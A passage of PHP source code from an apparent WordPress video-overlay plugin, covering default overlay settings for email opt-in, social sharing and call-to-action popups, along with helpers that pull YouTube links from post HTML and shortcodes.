			$default_video_option['video'] = "z0lFzBoKOxo";
			$default_video_option['vop_autoplay'] = "yes";
			$default_video_option['email_exit_time'] = 10;
			$default_video_option['video_email_time'] = 5;
			$default_video_option['enable_email_optin'] = "yes";
			$default_video_option['email_keep_playing'] = "yes";
			$default_video_option['enable_social'] = "yes";
			$default_video_option['enable_cta'] = "yes";
			$default_video_option['ar_form'] = "Place your html form code here";
			$default_video_option['social_entry_time'] = 8;
			$default_video_option['cta_time'] = 12;
			$default_video_option['cta_exit_time'] = 17;
			
			$default_video = array(
						"name"=>$default_video_option['name'],
						"video"=>$default_video_option['video'],
						"video_type"=>"youtube",
						"options"=>json_encode($default_video_option)
					);
			
			$wpdb->insert($table_name,$default_video);
		}
		
		update_option( 'vop_db_version', VOP_DB_VERSION );
		
	}

	function vop_update_db_check()
	{
		if (get_option( 'vop_db_version' )!==false AND version_compare(get_option( 'vop_db_version' ),VOP_DB_VERSION,"<") ) {
			$this->vop_install();
		}
	}
	
	function load_defaults($option)
	{
		switch($option)
		{
			case "overplay_option":
				return array(	"name" =>"",
								"video" =>"",
								"vop_video_width" =>"640",
								"vop_video_height" =>"360",
								"vop_autoplay" =>"no",
								"vop_autoplay_time" =>"",
								"video_play_img" =>"",
								"video_end_img" =>"",
								"video_end_url" =>"",
								"video_color_scheme" =>"black",
								"vop_seo_title" =>"",
								"vop_seo_desc" =>"",
								"video_email_show" =>"yes",
								"video_email_time" =>"5",
								"video_email_title" =>"Sign Up Below!",
								"video_email_skip_text" =>"No Thanks",
								"video_email_wait_text" =>"Please Wait…",
								"video_email_thanks_text" =>"Thankyou For Subscribing",
								"video_email_name_label" =>"Name…",
								"video_email_email_label" =>"Email…",
								"video_email_button_text" =>"Subscribe",
								"email_button_style" =>"vop-a",
								"video_email_service" =>"other",
								"ar_formurl" =>"",
								"ar_form" =>"",
								"ar_formfldname" =>"",
								"ar_formfldemail" =>"",
								"ar_form1" =>"",
								"email_start_animation" =>"short_bottom",
								"email_position" =>"top",
								"email_easing_in" =>"easeOutBounce",
								"email_in_animation_time" =>"1000",
								"email_end_animation" =>"long_bottom_left",
								"email_easing_out" =>"swing",
								"email_out_animation_time" =>"1000",
								"social_entry_time" =>"5",
								"social_exit_time" =>"500",
								"social_networks" => array("facebook","googleplus","linkedin","pinterest","tumblr","twitter"),
								"social_display" =>"h",
								"social_set" =>"7",
								"social_headline" =>"Like Me",
								"what_to_share" =>"post",
								"social_text" =>"",
								"social_desc" =>"",
								"social_url" =>"",
								"social_start_animation" =>"long_right",
								"social_position" =>"bottom_left",
								"social_easing_in" =>"easeOutBounce",
								"social_in_animation_time" =>"1000",
								"social_end_animation" =>"short_left",
								"social_easing_out" =>"swing",
								"social_out_animation_time" =>"1000",
								"quest_time" =>"10",
								"quest_question" =>"Question",
								"quest_ans1" =>"Answer1",
								"quest_button_style1" =>"vop-e",
								"quest_video1" =>"",
								"quest_ans2" =>"Answer2",
								"quest_button_style2" =>"vop-f",
								"quest_video2" =>"",
								"quest_skip_text" =>"Skip this question",
								"funnel_start_animation" =>"short_bottom",
								"funnel_position" =>"top",
								"funnel_easing_in" =>"swing",
								"funnel_in_animation_time" =>"1000",
								"funnel_end_animation" =>"short_bottom",
								"funnel_easing_out" =>"swing",
								"funnel_out_animation_time" =>"1000",
								"cta_time" =>"15",
								"cta_headline" =>"This is headline",
								"cta_button_text" =>"Click Here",
								"cta_url" =>"#",
								"cta_link_target" =>"yes",
								"cta_button_style" =>"primary",
								"cta_start_animation" =>"long_bottom",
								"cta_position" =>"top",
								"cta_easing_in" =>"easeOutBounce",
								"cta_in_animation_time" =>"1000",
								"cta_end_animation" =>"long_bottom_left",
								"cta_easing_out" =>"swing",
								"cta_out_animation_time" =>"1000",
								"ad_time" =>"",
								"ad_img" =>"",
								"ad_width" =>"",
								"ad_height" =>"",
								"ad_url" =>"",
								"ad_url_target" =>"yes",
								"ad_start_animation" =>"short_top_right",
								"ad_position" =>"top_right",
								"ad_easing_in" =>"swing",
								"ad_in_animation_time" =>"1000",
								"html_in_animation_time" =>"1000",
								"ad_end_animation" =>"short_top_right",
								"ad_easing_out" =>"swing",
								"ad_out_animation_time" =>"1000",
								"html_out_animation_time" =>"1000",
								"social_headline_font_size" =>"14",
								"social_headline_font_color" =>"#9d0d0d",
								"social_headline_font_style" =>"bold",
							);
				break;
			
		}
	}
	
	function tooltip($html)
	{
		echo "<span class='tooltip'>
					<img class='callout' src='".plugins_url("assets/images/callout.gif",__FILE__)."' />
					<span>".$html."</span>
				</span>";		
	}
	
	function ctr($views,$clicks)
	{
		if($views == 0)
			return $views;
		else
			return round(($clicks*100)/$views,2);
	}
	
	function vop_get_youtube_embed_codes_from_html($html)
	{
		$youtube_urls = array();
		libxml_use_internal_errors(true);
		$document = new DOMDocument();
		$document->loadHTML($html);
		$lst = $document->getElementsByTagName('iframe');
		for ($i=0; $i<$lst->length; $i++) {
			$iframe= $lst->item($i);
			if(strpos($iframe->attributes->getNamedItem('src')->value,'videoseries'))
				$youtube_urls[strip_tags($iframe->attributes->getNamedItem('src')->value)] = "playlist";

		}
		
		$lst = $document->getElementsByTagName('iframe');
		
		for ($i=0; $i<$lst->length; $i++) {
			$iframe= $lst->item($i);
			if(strpos($iframe->attributes->getNamedItem('src')->value,'youtube') AND !strpos($iframe->attributes->getNamedItem('src')->value,'videoseries'))
				$youtube_urls [strip_tags($iframe->attributes->getNamedItem('src')->value)] = 'video';
		}
		
		
		$lst = $document->getElementsByTagName('embed');
		
		for ($i=0; $i<$lst->length; $i++) {
			$iframe= $lst->item($i);
			if(strpos($iframe->attributes->getNamedItem('src')->value,'youtube') AND !strpos($iframe->attributes->getNamedItem('src')->value,'videoseries'))
				$youtube_urls [strip_tags($iframe->attributes->getNamedItem('src')->value)] = 'video';
			
		}
		
		return $youtube_urls;
	}
	function vop_check_shortcode_videos($html)
	{
		$return = array();
		if(preg_match_all('/(\[youtube\]).*?(\[\/youtube\])/',$html,$match))
		{
			foreach ($match[0] as $m)
			{
				$bbb = str_replace('[youtube]','',$m);
				$m = str_replace('[/youtube]','',$bbb);
				$m = trim($m);
				if (strlen($m)==11)
					$return["http://www.youtube.com/watch?v=".$m] = 'video';
				else if(substr($m,0,2)=='PL')
					$return["https://www.youtube.com/playlist?list=".$m] = 'playlist';
				else
					$return[$m] = 'video';
			}
			
		}
		return $return;
	}
	function vop_get_url_list($data)
	{
		$data = preg_replace('#<[^>]+>#', ' ', $data);
		$reg_exUrl = "/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/[^\"'\s\[\]]*)?/";
		$return = array();
		if(preg_match_all($reg_exUrl, $data, $url))
		{
			foreach($url[0] as $u)
			{	if (strpos($u,'youtube') OR strpos($u,'youtu.be'))
				{
					
					if(strpos($u,'list') OR strpos($u,'videoseries'))
						$return[strip_tags(rtrim(rtrim($u,'"'),"'"))] = 'playlist';
					else				
						$return[strip_tags(rtrim(rtrim($u,'"'),"'"))] = 'video';
				}
			}
			
		}
		return $return;
	}
	
	function adjustColorBrightness($hex, $steps) {
    // Steps should be between -255 and 255. Negative = darker, positive = lighter
    $steps = max(-255, min(255, $steps));

    // Normalize into a six character long hex string
    $hex = str_replace('#', '', $hex);
    if (strlen($hex) == 3) {
        $hex = str_repeat(substr($hex,0,1), 2).str_repeat(substr($hex,1,1), 2).str_repeat(substr($hex,2,1), 2);
    }

    // Split into three parts: R, G and B
    $color_parts = str_split($hex, 2);
    $return = '#';

    foreach ($color_parts as $color) {
        $color   = hexdec($color); // Convert to decimal
        $color   = max(0,min(255,$color + $steps)); // Adjust color
        $return .= str_pad(dechex($color), 2, '0', STR_PAD_LEFT); // Make two char hex code
    }

    return $return;
}
};

global $videooverplay_class;
$videooverplay_class = new videooverplay();
?>